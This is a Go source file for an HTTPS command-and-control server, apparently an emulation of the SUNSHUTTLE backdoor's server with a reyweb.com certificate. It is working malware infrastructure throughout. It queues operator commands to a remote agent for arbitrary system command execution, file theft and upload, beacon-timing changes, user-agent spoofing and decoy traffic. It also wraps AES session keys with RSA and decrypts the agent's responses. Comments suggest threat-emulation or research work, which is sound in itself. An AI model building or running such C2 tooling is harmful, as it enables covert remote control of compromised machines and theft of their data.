package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/google/shlex"
)

// mkcert -key-file key.pem -cert-file cert.pem reyweb.com *.reyweb.com
const (
	certFile = "cert.pem"
	keyFile  = "key.pem"
)

// openssl rsa -in private.pem -pubout -RSAPublicKey_out -out public.pem
const (
	publicRSAKey = `
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA0Aj/3K3m/rKNESwUfHC9qAhnsNYA9bJ4HQ30DPsfPDvbbHZmUj5n
yp2abjYZYMQbWa2+ZO4Ixgfdm0FzsAH/haKIN4sSkbw+YRESYW35MnMI3Adfmj/e
K/yKNblyoe/7iWP3nz+y4Q/QI0L6BrF7VodTaDYtDup3iI+B5zjmhElf9FmgS1Ji
DUgydz5VXJR/esv6hB7GMfEb/3sIAzv5qcwEvGK5HH1EzQ7zjauyhbsF9pHRzCFY
lvW4OtaU0o3xjVufo5UwYRS5p/EFpof45zuJGLJ02cKUmxc0OX53t3Bn9WXYaDDh
Yp/RPzywG8N9gTBv8rKxRIsFxxKu+8wK+QIDAQAB
-----END RSA PUBLIC KEY-----
`
)

// Commands
const (
	AgentCommand_SendTimeStamp            = "3487wD9t2OZkvqdwRpqPeE"
	AgentCommand_ExecSysCommand           = "1kG4NaRX83BCMgLo38Bjq"
	AgentCommand_ExecSysCommandSendOutput = "hB0upT6CUmdRaR2KVBvxrJ"
	AgentCommand_ToggleFalseRequesting    = "aQJmWJzXdYK721mGBI3U"
	AgentCommand_FetchFile                = "TMuhGdA9EHY"
	AgentCommand_ChangeBeaconingTime      = "zSsP2TSJJm3a"
	AgentCommand_ChangeUserAgent          = "W5VYP9Iu2uyHK"
	AgentCommand_UploadFile               = "HuLjdQwyCHI"
	AgentCommand_SetActivationTime        = "ubFxROBRwfswVRWNjLC"
	AgentCommand_Kill                     = "13QTR5pC1R"

	CommandType = "P5hCrabkKf"

	SrvCommand_CleanFile          = "do1KiqzhQ"
	SrvCommand_DownloadFile       = "t5UITQ2PdFg5"
	SrvCommand_RequestSessionKey  = "gZLXIeKI"
	SrvCommand_RetrieveSessionKey = "cIHiqD5p4da6OeB"

	AgentRespType_MsgFile = "xpjQVt3bJzWuv"

	AgentResp_MsgFileData = "i9tL7syTtS"

	CommandResult = "Dp3jaZ7if"

	MsgAck = "HuLjdQwyCH"
)

var (
	debugging = flag.Bool("debug", false, "Debugging Enabled, generates static aes key")
)

var (
	aesKey []byte

	commandQueue      chan string
	maxCommandInQueue = 5

	userToAgentCommands = map[string]string{
		"send_time_stamp":         AgentCommand_SendTimeStamp,
		"exec_cmd":                AgentCommand_ExecSysCommand,
		"exec_cmd_out":            AgentCommand_ExecSysCommandSendOutput,
		"toggle_false_requesting": AgentCommand_ToggleFalseRequesting,
		"fetch_file":              AgentCommand_FetchFile,
		"change_beaconing_time":   AgentCommand_ChangeBeaconingTime,
		"change_user_agent":       AgentCommand_ChangeUserAgent,
		"set_activation_time":     AgentCommand_SetActivationTime,
		"kill":                    AgentCommand_Kill,
	}

	falseRequesting     = false
	readyToSendCommands = false
)

func readLine() string {
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		return scanner.Text()
	}

	return ""
}

func boolToInt(x bool) int {
	if !x {
		return 0
	} else {
		return 1
	}
}

func readCommands() {
	for {
		if !readyToSendCommands {
			continue
		}

		fmt.Print("> ")

		userCommand := readLine()
		if userCommand == "" {
			continue
		}

		if userCommand == "help" {
			fmt.Printf(`
	- send_time_stamp
	- exec_cmd
	- exec_cmd_out
	- toggle_false_requesting
	- upload_file
	- fetch_file
	- change_beaconing_time
	- change_user_agent
	- set_activation_time
	- kill
`)
			continue
		}

		userCommand = strings.ReplaceAll(userCommand, "\\", "/")
		parts, _ := shlex.Split(userCommand)
		userCommandOp := parts[0]

		if len(parts) > 1 {
			userCommandArgs := parts[1:]

			switch userCommandOp {
			case "upload_file":
				if len(userCommandArgs) != 2 {
					fmt.Println("Usage: upload_file <remote_path> <local_path>")
					continue
				}

				localPath := userCommandArgs[0]
				remotePath := userCommandArgs[1]

				commandQueue <- fmt.Sprintf("%s|%s<>", remotePath, localPath)
			case "change_beaconing_time":
				start, err := strconv.Atoi(userCommandArgs[0])
				if err != nil {
					fmt.Println(err)
					continue
				}

				end, err := strconv.Atoi(userCommandArgs[1])
				if err != nil {
					fmt.Println(err)
					continue
				}

				if start > end {
					tmp := start
					start = end
					end = tmp
				}

				commandQueue <- fmt.Sprintf("%s 0|%d|%d", userToAgentCommands[userCommandOp], start, end)
			default:

				if _, ok := userToAgentCommands[userCommandOp]; !ok {
					commandQueue <- userCommand
				} else {
					commandQueue <- fmt.Sprintf("%s %s", userToAgentCommands[userCommandOp], strings.Join(userCommandArgs, " "))
				}
			}
		} else {
			if userCommandOp == "toggle_false_requesting" {
				falseRequesting = !falseRequesting
				commandQueue <- fmt.Sprintf("%s %d", userToAgentCommands[userCommandOp], boolToInt(falseRequesting))
			} else {
				if _, ok := userToAgentCommands[userCommandOp]; !ok {
					commandQueue <- userCommandOp
				} else {
					commandQueue <- userToAgentCommands[userCommandOp]
				}
			}
		}
	}
}

func genAesKey() ([]byte, error) {
	key := make([]byte, 0x20)

	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, err
	}

	return key, nil
}

func getCommand() string {
	select {
	case command := <-commandQueue:
		return command
	default:
		return ""
	}
}

func isBeaconing(r *http.Request) bool {
	_, err := r.Cookie(CommandType)
	return err == http.ErrNoCookie
}

func srvSend(w http.ResponseWriter, data []byte) error {
	encrypted, err := aesEncrypt(aesKey, string(data))
	if err != nil {
		return err
	}

	w.Write([]byte("*" + base64.StdEncoding.EncodeToString([]byte(encrypted))))
	return nil
}

func srvDecrypt(data []byte) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		return nil, err
	}

	decrypted, err := aesDecrypt(aesKey, string(decoded))
	return []byte(decrypted), err
}

func handler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		if isBeaconing(r) {
			command := getCommand()

			if command == "" {
				break
			}

			srvSend(w, []byte(command))
		} else {
			CommandType, _ := r.Cookie(CommandType)

			switch CommandType.Value {
			case SrvCommand_RequestSessionKey:
				fmt.Println(">> Agent Connnected.")
				w.Write([]byte(MsgAck))

			case SrvCommand_RetrieveSessionKey:
				encSessionKey, err := rsaEncrypt(publicRSAKey, aesKey)
				if err != nil {
					log.Println(err)
					break
				}

				w.Write([]byte(base64.StdEncoding.EncodeToString(encSessionKey)))

				if !readyToSendCommands {
					fmt.Println(">> Session Established.")
					readyToSendCommands = true
				}

			// I have no idea what this is supposed to do.
			case SrvCommand_CleanFile:
				if fileName, err := r.Cookie("TjZIpGWvg"); err == nil {
					fmt.Println("Clean File Request: ", fileName)
					w.Write([]byte(MsgAck))
				}

			case SrvCommand_DownloadFile:
				if fileName, err := r.Cookie("TjZIpGWvg"); err == nil {
					// In my theory they did this, so it puts the agent in a state to receive any data
					// but let the server handle the transfer, weither its a url, filepath, etc ...
					// even the filebytes them would work but it doesn't make sense obviously.
					// Its just any data that we would like to associate with that download request
					// in later requests.

					fmt.Println("Download Request: ", fileName.Value)
					file, err := os.ReadFile(fileName.Value)
					if err != nil {
						fmt.Println("Server Error: ", err)
						break
					}

					encrypted, _ := aesEncrypt(aesKey, base64.StdEncoding.EncodeToString([]byte(file)))
					w.Write([]byte(MsgAck + base64.StdEncoding.EncodeToString([]byte(encrypted))))
				}
			}
		}
	case http.MethodPost:
		r.ParseForm()

		cookie, _ := r.Cookie(CommandType)
		switch cookie.Value {
		case AgentRespType_MsgFile:
			commandResp := r.FormValue(AgentResp_MsgFileData)
			decrypted, _ := srvDecrypt([]byte(commandResp))

			// TODO: Save To File.
			fmt.Println(hex.Dump(decrypted))
			w.Write([]byte(MsgAck + "ABCD"))
		default:
			if _, ok := r.Form[CommandResult]; ok {
				commandResp := r.FormValue(CommandResult)
				decrypted, _ := srvDecrypt([]byte(commandResp))
				fmt.Println("Response: ", string(decrypted))
			}

			w.Write([]byte(MsgAck))
		}
	}
}

func main() {
	flag.Parse()

	if *debugging {
		aesKey = []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
	} else {
		aesKey, _ = genAesKey()
	}

	commandQueue = make(chan string, maxCommandInQueue)

	mux := http.NewServeMux()
	mux.HandleFunc("/", handler)

	keyLogFile, _ := os.Create("server_secrets.log")
	srv := &http.Server{
		Addr:    ":443",
		Handler: mux,
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			KeyLogWriter:             keyLogFile,
		},
	}

	wg := &sync.WaitGroup{}

	wg.Add(2)

	fmt.Println("emusun listening on :443 ...")

	go readCommands()
	go srv.ListenAndServeTLS(certFile, keyFile)

	wg.Wait()
}
